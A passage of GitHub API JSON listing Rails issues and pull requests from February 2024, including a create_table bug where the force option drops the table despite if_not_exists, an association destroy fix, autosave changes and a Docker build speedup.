        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51069",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51069/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51069/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51069/events",
        "html_url": "https://github.com/rails/rails/pull/51069",
        "id": 2132875298,
        "node_id": "PR_kwDNIULOZsghhw",
        "number": 51069,
        "title": "Issue 51067 create table bug",
        "user": {
            "login": "allisonphillips",
            "id": 8813886,
            "node_id": "MDQ6VXNlcjg4MTM4ODY=",
            "avatar_url": "https://avatars.githubusercontent.com/u/8813886?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/allisonphillips",
            "html_url": "https://github.com/allisonphillips",
            "followers_url": "https://api.github.com/users/allisonphillips/followers",
            "following_url": "https://api.github.com/users/allisonphillips/following{/other_user}",
            "gists_url": "https://api.github.com/users/allisonphillips/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/allisonphillips/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/allisonphillips/subscriptions",
            "organizations_url": "https://api.github.com/users/allisonphillips/orgs",
            "repos_url": "https://api.github.com/users/allisonphillips/repos",
            "events_url": "https://api.github.com/users/allisonphillips/events{/privacy}",
            "received_events_url": "https://api.github.com/users/allisonphillips/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107188,
                "node_id": "MDU6TGFiZWwxMDcxODg=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionmailer",
                "name": "actionmailer",
                "color": "8B00FC",
                "default": false,
                "description": null
            },
            {
                "id": 107189,
                "node_id": "MDU6TGFiZWwxMDcxODk=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionpack",
                "name": "actionpack",
                "color": "FFF700",
                "default": false,
                "description": null
            },
            {
                "id": 300028327,
                "node_id": "MDU6TGFiZWwzMDAwMjgzMjc=",
                "url": "https://api.github.com/repos/rails/rails/labels/actioncable",
                "name": "actioncable",
                "color": "bfdadc",
                "default": false,
                "description": null
            },
            {
                "id": 1174770998,
                "node_id": "MDU6TGFiZWwxMTc0NzcwOTk4",
                "url": "https://api.github.com/repos/rails/rails/labels/actionmailbox",
                "name": "actionmailbox",
                "color": "f4a6cb",
                "default": false,
                "description": ""
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-13T18:02:29Z",
        "updated_at": "2024-02-13T18:23:11Z",
        "closed_at": "2024-02-13T18:12:58Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51069",
            "html_url": "https://github.com/rails/rails/pull/51069",
            "diff_url": "https://github.com/rails/rails/pull/51069.diff",
            "patch_url": "https://github.com/rails/rails/pull/51069.patch",
            "merged_at": null
        },
        "body": "> [!WARNING] \r\n> Had to submit this in a web editor and realizing my fork is way out of date, will fix the extra commits on here\r\n\r\nSolving https://github.com/rails/rails/issues/51067\r\n\r\nI'm only familiar with writing rails tests in rspec, I wrote a test after skimming the other syntax in the file but please let me know if there is a better way.\r\n\r\n<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nThis Pull Request has been created because https://github.com/rails/rails/issues/51067\r\n\r\n### Detail\r\n\r\nThis Pull Request changes `create_table` to ignore the `force` option (which drops the table) if the `if_not_exists` option is present\r\n\r\n### Additional information\r\n\r\nIf you copy a `create_table` migration from a schema dump and add the `if_not_exists` guard but forget to remove `force`, it will drop your table when you migrate it. \r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [ ] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51069/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51069/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51068",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51068/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51068/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51068/events",
        "html_url": "https://github.com/rails/rails/pull/51068",
        "id": 2132872666,
        "node_id": "PR_kwDNIULOZsgYfA",
        "number": 51068,
        "title": "Don't load `*_test.rb` file from the \"fixtures\" folder:",
        "user": {
            "login": "Edouard-chin",
            "id": 8122246,
            "node_id": "MDQ6VXNlcjgxMjIyNDY=",
            "avatar_url": "https://avatars.githubusercontent.com/u/8122246?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/Edouard-chin",
            "html_url": "https://github.com/Edouard-chin",
            "followers_url": "https://api.github.com/users/Edouard-chin/followers",
            "following_url": "https://api.github.com/users/Edouard-chin/following{/other_user}",
            "gists_url": "https://api.github.com/users/Edouard-chin/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/Edouard-chin/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/Edouard-chin/subscriptions",
            "organizations_url": "https://api.github.com/users/Edouard-chin/orgs",
            "repos_url": "https://api.github.com/users/Edouard-chin/repos",
            "events_url": "https://api.github.com/users/Edouard-chin/events{/privacy}",
            "received_events_url": "https://api.github.com/users/Edouard-chin/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-13T18:00:38Z",
        "updated_at": "2024-02-13T23:09:25Z",
        "closed_at": "2024-02-13T23:09:25Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51068",
            "html_url": "https://github.com/rails/rails/pull/51068",
            "diff_url": "https://github.com/rails/rails/pull/51068.diff",
            "patch_url": "https://github.com/rails/rails/pull/51068.patch",
            "merged_at": "2024-02-13T23:09:25Z"
        },
        "body": "### Motivation / Background\r\n\r\nDon't load `*_test.rb` files from the \"fixtures\" folder.\r\n\r\n\r\n### Detail\r\n\r\nIf an application has files named `*_test.rb` in the \"fixtures/files\" folder, they were picked up to be loaded. In most cases this would result in a LoadError as its likely those files include code that can't be loaded.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51068/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51068/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51067",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51067/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51067/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51067/events",
        "html_url": "https://github.com/rails/rails/issues/51067",
        "id": 2132791988,
        "node_id": "I_kwDNIULOfx_StA",
        "number": 51067,
        "title": "create_table `force` option drops table when `if_not_exists` option is present",
        "user": {
            "login": "allisonphillips",
            "id": 8813886,
            "node_id": "MDQ6VXNlcjg4MTM4ODY=",
            "avatar_url": "https://avatars.githubusercontent.com/u/8813886?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/allisonphillips",
            "html_url": "https://github.com/allisonphillips",
            "followers_url": "https://api.github.com/users/allisonphillips/followers",
            "following_url": "https://api.github.com/users/allisonphillips/following{/other_user}",
            "gists_url": "https://api.github.com/users/allisonphillips/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/allisonphillips/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/allisonphillips/subscriptions",
            "organizations_url": "https://api.github.com/users/allisonphillips/orgs",
            "repos_url": "https://api.github.com/users/allisonphillips/repos",
            "events_url": "https://api.github.com/users/allisonphillips/events{/privacy}",
            "received_events_url": "https://api.github.com/users/allisonphillips/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 41328116,
                "node_id": "MDU6TGFiZWw0MTMyODExNg==",
                "url": "https://api.github.com/repos/rails/rails/labels/attached%20PR",
                "name": "attached PR",
                "color": "006b75",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-13T17:08:04Z",
        "updated_at": "2024-02-14T16:03:21Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "The problem is here:\r\nhttps://github.com/rails/rails/blob/36c1591bcb5e0ee3084759c7f42a706fe5bb7ca7/activerecord/lib/active_record/connection_adapters/abstract/schema_statements.rb#L293-L300\r\n\r\nI can't submit this from my work computer, but can somebody put up a PR to make this change to L299:\r\n```ruby\r\ndrop_table(table_name, force: force, if_exists: true) unless td.if_not_exists\r\n```\r\n\r\nEdge case where this occurs:\r\nAdding guarded migrations to make migration schema consistent with schema dump for DB that has migrations applied to it that are not in the schema history.\r\nIf you copy the table definition from the schema dump and add the `if_not_exists`, running the migration will drop the table if it exists",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51067/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51067/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51066",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51066/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51066/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51066/events",
        "html_url": "https://github.com/rails/rails/pull/51066",
        "id": 2132766012,
        "node_id": "PR_kwDNIULOZsaoig",
        "number": 51066,
        "title": "Fix bi-directional destroying of has_one :through",
        "user": {
            "login": "airblade",
            "id": 7265,
            "node_id": "MDQ6VXNlcjcyNjU=",
            "avatar_url": "https://avatars.githubusercontent.com/u/7265?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/airblade",
            "html_url": "https://github.com/airblade",
            "followers_url": "https://api.github.com/users/airblade/followers",
            "following_url": "https://api.github.com/users/airblade/following{/other_user}",
            "gists_url": "https://api.github.com/users/airblade/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/airblade/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/airblade/subscriptions",
            "organizations_url": "https://api.github.com/users/airblade/orgs",
            "repos_url": "https://api.github.com/users/airblade/repos",
            "events_url": "https://api.github.com/users/airblade/events{/privacy}",
            "received_events_url": "https://api.github.com/users/airblade/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-13T16:52:49Z",
        "updated_at": "2024-02-27T18:31:06Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51066",
            "html_url": "https://github.com/rails/rails/pull/51066",
            "diff_url": "https://github.com/rails/rails/pull/51066.diff",
            "patch_url": "https://github.com/rails/rails/pull/51066.patch",
            "merged_at": null
        },
        "body": "With a bi-directional has one through association, where the join model belongs to each parent with `dependent: :destroy`, destroying either parent should destroy the through record and the other parent.\r\n\r\n    class Left < ActiveRecord::Base\r\n      has_one :middle, dependent: :destroy\r\n      has_one :right, through: :middle\r\n    end\r\n\r\n    class Middle < ActiveRecord::Base\r\n      belongs_to :left, dependent: :destroy\r\n      belongs_to :right, dependent: :destroy\r\n    end\r\n\r\n    class Right < ActiveRecord::Base\r\n      has_one :middle, dependent: :destroy\r\n      has_one :left, through: :middle\r\n    end\r\n\r\nHowever this only worked from one end.  When destroying the \"non-working\" end, the join model was correctly destroyed but the other end was not.\r\n\r\nIn the example above:\r\n\r\n- `right.destroy` correctly destroys its `middle` and its `left`;\r\n- `left.destroy` destroys its `middle` but not its `right`.\r\n\r\nThe end which worked depended on the order of `belongs_to` statements in the join model.\r\n\r\nThis commit ensures that the no matter which end you destroy, the far end is destroyed (along with the join record).\r\n\r\nFixes #50948.\r\n\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51066/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51066/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51065",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51065/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51065/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51065/events",
        "html_url": "https://github.com/rails/rails/pull/51065",
        "id": 2132750567,
        "node_id": "PR_kwDNIULOZsZ0Rw",
        "number": 51065,
        "title": "Autosave changes disappearing and speed improvement",
        "user": {
            "login": "malomalo",
            "id": 716,
            "node_id": "MDQ6VXNlcjcxNg==",
            "avatar_url": "https://avatars.githubusercontent.com/u/716?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/malomalo",
            "html_url": "https://github.com/malomalo",
            "followers_url": "https://api.github.com/users/malomalo/followers",
            "following_url": "https://api.github.com/users/malomalo/following{/other_user}",
            "gists_url": "https://api.github.com/users/malomalo/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/malomalo/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/malomalo/subscriptions",
            "organizations_url": "https://api.github.com/users/malomalo/orgs",
            "repos_url": "https://api.github.com/users/malomalo/repos",
            "events_url": "https://api.github.com/users/malomalo/events{/privacy}",
            "received_events_url": "https://api.github.com/users/malomalo/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 664533972,
                "node_id": "MDU6TGFiZWw2NjQ1MzM5NzI=",
                "url": "https://api.github.com/repos/rails/rails/labels/activestorage",
                "name": "activestorage",
                "color": "bfd4f2",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-02-13T16:44:16Z",
        "updated_at": "2024-02-15T19:39:58Z",
        "closed_at": "2024-02-15T19:39:57Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51065",
            "html_url": "https://github.com/rails/rails/pull/51065",
            "diff_url": "https://github.com/rails/rails/pull/51065.diff",
            "patch_url": "https://github.com/rails/rails/pull/51065.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nWhen `autosave: true` is set on both ends of a relation `save` and/or `valid?` can be called more than once removing the changes that just happened during the current `save` and making `previous_changes` and empty hash.\r\n\r\nAdditionally when there is a lot of records in memory save on a sub record can be called a significant amount of times. It seem that the child models are saved and validated in every permutation possible. This PR results in every record being called at most 1 time and can significantly reduce CPU usage and time to save in this situations.\r\n\r\n### Detail\r\n\r\nThis PR adds `memory` to ensure that each record only gets saved and/or validated only once while traversing the autosave tree, ensuring the changes are available after saving via the `previous_changes` method.\r\n\r\nFixes #28491.\r\n\r\n#28491 suggested adding a variable to avoid clearing the changes on the root record which worked; but would not fix the issue if the two models with the autosave true are related to another separate model that is being saved or updated.\r\n\r\nFixes #46438.\r\n\r\nThis PR also supplants #46438 and enhances it by being able to work across connections and increase speed by only allowing autosaved child models to be saved or validated only once.\r\n\r\n### Checklist\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n* [ ] CI is passing.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51065/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51065/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51064",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51064/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51064/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51064/events",
        "html_url": "https://github.com/rails/rails/pull/51064",
        "id": 2132584923,
        "node_id": "PR_kwDNIULOZsQvlQ",
        "number": 51064,
        "title": "Fix typo in Debugging Guide [ciskip]",
        "user": {
            "login": "mkasberg",
            "id": 12214617,
            "node_id": "MDQ6VXNlcjEyMjE0NjE3",
            "avatar_url": "https://avatars.githubusercontent.com/u/12214617?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/mkasberg",
            "html_url": "https://github.com/mkasberg",
            "followers_url": "https://api.github.com/users/mkasberg/followers",
            "following_url": "https://api.github.com/users/mkasberg/following{/other_user}",
            "gists_url": "https://api.github.com/users/mkasberg/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/mkasberg/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/mkasberg/subscriptions",
            "organizations_url": "https://api.github.com/users/mkasberg/orgs",
            "repos_url": "https://api.github.com/users/mkasberg/repos",
            "events_url": "https://api.github.com/users/mkasberg/events{/privacy}",
            "received_events_url": "https://api.github.com/users/mkasberg/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-13T15:29:00Z",
        "updated_at": "2024-02-14T22:33:38Z",
        "closed_at": "2024-02-14T18:44:00Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51064",
            "html_url": "https://github.com/rails/rails/pull/51064",
            "diff_url": "https://github.com/rails/rails/pull/51064.diff",
            "patch_url": "https://github.com/rails/rails/pull/51064.patch",
            "merged_at": "2024-02-14T18:44:00Z"
        },
        "body": "While I was reading the Debugging Rails Applications guide, this typo threw me off and I had to re-read it to understand the intended meaning, so it seems like it's worth fixing. One of the parameter names to the `break` method in the debug gem was incorrect (badly copy/pasted, I think) in the guide.\r\n\r\n### Checklist\r\n\r\nN/A\r\n\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51064/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51064/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51063",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51063/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51063/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51063/events",
        "html_url": "https://github.com/rails/rails/pull/51063",
        "id": 2132353385,
        "node_id": "PR_kwDNIULOZsEEdg",
        "number": 51063,
        "title": "Speedup Docker Build Time",
        "user": {
            "login": "anonychun",
            "id": 41361100,
            "node_id": "MDQ6VXNlcjQxMzYxMTAw",
            "avatar_url": "https://avatars.githubusercontent.com/u/41361100?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/anonychun",
            "html_url": "https://github.com/anonychun",
            "followers_url": "https://api.github.com/users/anonychun/followers",
            "following_url": "https://api.github.com/users/anonychun/following{/other_user}",
            "gists_url": "https://api.github.com/users/anonychun/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/anonychun/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/anonychun/subscriptions",
            "organizations_url": "https://api.github.com/users/anonychun/orgs",
            "repos_url": "https://api.github.com/users/anonychun/repos",
            "events_url": "https://api.github.com/users/anonychun/events{/privacy}",
            "received_events_url": "https://api.github.com/users/anonychun/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-13T13:41:30Z",
        "updated_at": "2024-02-13T23:17:05Z",
        "closed_at": "2024-02-13T23:17:05Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51063",
            "html_url": "https://github.com/rails/rails/pull/51063",
            "diff_url": "https://github.com/rails/rails/pull/51063.diff",
            "patch_url": "https://github.com/rails/rails/pull/51063.patch",
            "merged_at": "2024-02-13T23:17:05Z"
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nThis pull request aims to reduce Docker build time within the Rails codebase by eliminating redundant operations. impacting development efficiency and productivity.\r\n\r\n### Detail\r\n\r\nPreviously individual layers within the Dockerfile installed some same dependencies repeatedly, causing redundancy and build time increase.\r\n\r\nThis change:\r\nMoves commonly used dependencies to the base layer of the Dockerfile.\r\nOther layers now inherit these dependencies from the base layer, avoiding redundant installations.\r\nThis approach leverages Docker's layering mechanism to ensure all layers have access to required dependencies while eliminating unnecessary repetition.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51063/reactions",
            "total_count": 1,
            "+1": 1,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51063/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51062",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51062/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51062/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51062/events",
        "html_url": "https://github.com/rails/rails/issues/51062",
        "id": 2132248794,
        "node_id": "I_kwDNIULOfxeI2g",
        "number": 51062,
        "title": "has_many through alias_method",
        "user": {
            "login": "OskarEichler",
            "id": 62393985,
            "node_id": "MDQ6VXNlcjYyMzkzOTg1",
            "avatar_url": "https://avatars.githubusercontent.com/u/62393985?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/OskarEichler",
            "html_url": "https://github.com/OskarEichler",
            "followers_url": "https://api.github.com/users/OskarEichler/followers",
            "following_url": "https://api.github.com/users/OskarEichler/following{/other_user}",
            "gists_url": "https://api.github.com/users/OskarEichler/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/OskarEichler/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/OskarEichler/subscriptions",
            "organizations_url": "https://api.github.com/users/OskarEichler/orgs",
            "repos_url": "https://api.github.com/users/OskarEichler/repos",
            "events_url": "https://api.github.com/users/OskarEichler/events{/privacy}",
            "received_events_url": "https://api.github.com/users/OskarEichler/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 4,
        "created_at": "2024-02-13T12:46:02Z",
        "updated_at": "2024-02-14T03:27:43Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
